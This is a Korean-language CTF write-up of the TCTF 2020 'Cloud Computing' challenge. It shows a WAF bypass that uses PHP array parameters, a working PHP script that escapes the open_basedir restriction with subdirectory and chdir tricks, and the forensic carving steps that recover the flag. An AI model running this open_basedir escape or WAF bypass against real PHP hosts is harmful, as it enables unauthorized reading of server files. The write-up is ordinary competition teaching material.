---
layout: post
title: "[TCTF 2020] Cloud Computing"
author: "choiys"
comments: true
tags: [ctf, misc, php]
---

라온화이트햇 핵심연구팀 최용선([hcy3bkj@gmail.com](mailto:hcy3bkj@gmail.com))


# 0. 개요

2020. 06. 27 11:00 ~ 2020. 06. 29 11:00 (48h) 진행한 TCTF 2020 문제 중 misc 분야의 Cloud Computing 문제에 대한 Write Up입니다. 풀이에 사용된 취약점은 subdirectory를 이용한 php open_basedir 우회입니다.

# 1. 문제 설명

![/assets/1_.png](/assets/1_.png)

**Cloud Computing**

![/assets/2_.png](/assets/2_.png)

**Cloud Computing 문제 설명**

Cloud Computing 문제는 misc 분야의 문제로, 대회 기간 동안 총 42팀이 풀이하였습니다.

문제 설명에는 풀이에 힌트가 될만한 문구는 없습니다.

```php
<?php

error_reporting(0);

include 'function.php';

$dir = 'sandbox/' . sha1($_SERVER['REMOTE_ADDR'] . $_SERVER['HTTP_USER_AGENT']) . '/';

if(!file_exists($dir)){
  mkdir($dir);
}

switch ($_GET["action"] ?? "") {
  case 'pwd':
    echo $dir;
    break;
  case 'upload':
    $data = $_GET["data"] ?? "";
    if (waf($data)) {
      die('waf sucks...');
    }
    file_put_contents("$dir" . "index.php", $data);
  case 'shell':
    initShellEnv($dir);
    include $dir . "index.php";
    break;
  default:
    highlight_file(__FILE__);
    break;
}
```

**index.php**

문제 페이지에 접근해보면 위와 같은 소스코드를 확인할 수 있습니다.

문제 페이지에서는 사용자의 IP와 User Agent 정보를 이용하여 웹루트를 기준으로  `/sandbox/sha1(IP+UA)` 폴더를 생성합니다.

제공하는 기능은 아래와 같습니다.

---

1. ?action=pwd
    - 앞서 생성한 사용자 디렉토리($dir) 경로를 확인합니다.

        *( sandbox/373102940643ef0b8ab909ff4d486c5f584d7c86/ )*

2. ?action=upload&data=XXX
    - $dir 경로에 data 파라미터에 삽입한 내용을 index.php로 생성합니다.
    - data 파라미터를 waf 처리 후 탐지될 경우 `waf sucks...`를 출력 후 종료합니다.
    - 정상적으로 index.php를 생성할 경우 case문에 break가 없어 3. shell(코드 실행)로 이동합니다.
3. ?action=shell
    - $dir을 파라미터로 initShellEnv라는 함수를 호출합니다.
    - 이후 2에서 생성한 index.php를 include하여 실행합니다.

---

# 2. 문제 풀이

## 2-1. WAF

위 문제 설명에서 waf 함수가 있었으며, 이 함수는 공백, 특수문자 등을 필터링하는 기능을 가지고 있었습니다.

하지만 php에서는 HTTP 파라미터로 데이터를 전송할 때 `a[]=x`와 같이 전송할 시 Array로 인식을 하면서 이를 WAF에서 처리하지 않을 경우 손쉽게 우회가 가능합니다.

```php
<?php

function waf($data = '')
{
    if (strlen($data) > 35) {
        return true;
    }
    if (preg_match("/[!#%&'*+,-.: \t@^_`|A-Z]/m", $data, $match) >= 1) {
        return true;
    }
    return false;
}

function initShellEnv($dir)
{
    ini_set("open_basedir", "/var/www/html/$dir");
}
```

**function.php**

추출한 function.php를 살펴보면 Array에 대한 별다른 처리가 없는 것을 확인할 수 있습니다.

## 2-2. open_basedir

function.php의 `initShellEnv` 를 살펴보면 open_basedir을 사용자 경로로 설정하는 것을 확인할 수 있습니다.

![/assets/choi60.png](/assets/choi60.png)

**open_basedir**

open_basedir은 설정한 특정 디렉토리 및 하위 디렉토리만 접근할 수 있도록 합니다. 본 문제에서는 이 설정 때문에 상위 디렉토리에 접근할 경우 에러가 발생합니다.

```php
Warning: file_get_contents(): open_basedir restriction in effect. File(../../index.php) is not within the allowed path(s): (/var/www/html/sandbox/373102940643ef0b8ab909ff4d486c5f584d7c86/) in /var/www/html/sandbox/373102940643ef0b8ab909ff4d486c5f584d7c86/index.php on line 1

Warning: file_get_contents(../../index.php): failed to open stream: Operation not permitted in /var/www/html/sandbox/373102940643ef0b8ab909ff4d486c5f584d7c86/index.php on line 1
```

payload : [http://pwnable.org:47780/?action=upload&data[]=<?php error_reporting(E_ALL); ini_set("display_errors", 1); file_get_contents('../../index.php') ?>](http://pwnable.org:47780/?action=upload&data%5B%5D=%3C?php%20error_reporting(E_ALL);%20ini_set(%22display_errors%22,%201);%20file_get_contents(%27../../index.php%27)%20?%3E)

이를 우회하는 방법은 2가지가 있습니다.

1. subdirectory
2. symbolic link

본 문제에서는 subdirectory를 이용하여 open_basedir 설정을 우회하였습니다.

```php
<?php
<?php
    error_reporting(E_ALL);
    ini_set("display_errors", 1);

    $base_dir='/var/www/html/sandbox/373102940643ef0b8ab909ff4d486c5f584d7c86/';
    if(!file_exists($base_dir))
        mkdir($base_dir.'/choiys');
    chdir($base_dir.'/choiys');

    ini_set('open_basedir','..');
    chdir('../');
    chdir('../');
    chdir('../');
    chdir('../');
    chdir('../');
    chdir('../');
    ini_set('open_basedir','/');

    $dirs = scandir('/');
    foreach($dirs as $dir){
        echo $dir."\n";
    }

//    echo file_get_contents('/var/www/html/function.php');
?>
```

**bypass open_basedir**

---

1. open_basedir이 설정되어있는 상태에서 임의의 디렉토리를 생성합니다.
2. chdir 명령어를 통해 해당 디렉토리로 이동한 후 open_basedir을 상위 디렉토리로 변경합니다.
3. chdir 명령어를 반복 사용하여 루트 디렉토리로 이동합니다.
4. open_basedir을 루트 디렉토리(/)로 변경합니다.

---

위와 같은 프로세스를 통해 고정된 open_basedir을 루트 디렉토리로 변경할 수 있으며, 결과적으로 모든 디렉토리에 접근이 가능해집니다.

이후 scandir 함수를 사용하여 루트 디렉토리를 확인하여 flag 파일이 존재하는 것을 확인하였습니다.

```bash
➜  cloud_computing ls
agent  agent.i64  golang_loader_assist.py  legacy_flag  payload.py  res.out
➜  cloud_computing file res.out
res.out: gzip compressed data, was "flag.img", last modified: Fri Jun 26 00:54:32 2020, from Unix, original size modulo 2^32 1048064
➜  cloud_computing mv res.out res.gz
➜  cloud_computing gzip -d res.gz
➜  cloud_computing file res
res: Linux rev 1.0 ext2 filesystem data (mounted or unclean), UUID=d4d08581-e309-4c51-990b-6472ba249420 (large files)
```

추출한 파일을 확인해보면 gzip으로 압축되어있으며, 압축 해제 시 ext2 이미지를 얻을 수 있습니다.

![/assets/choi61.png](/assets/choi61.png)

해당 이미지를 hex에디터로 살펴보면 PNG파일이 존재하는 것을 확인할 수 있으며, 카빙하여 이미지를 추출하면 플래그를 얻을 수 있습니다.

![/assets/choi62.png](/assets/choi62.png)

FLAG : **flag{do_u_like_cloud_computing}**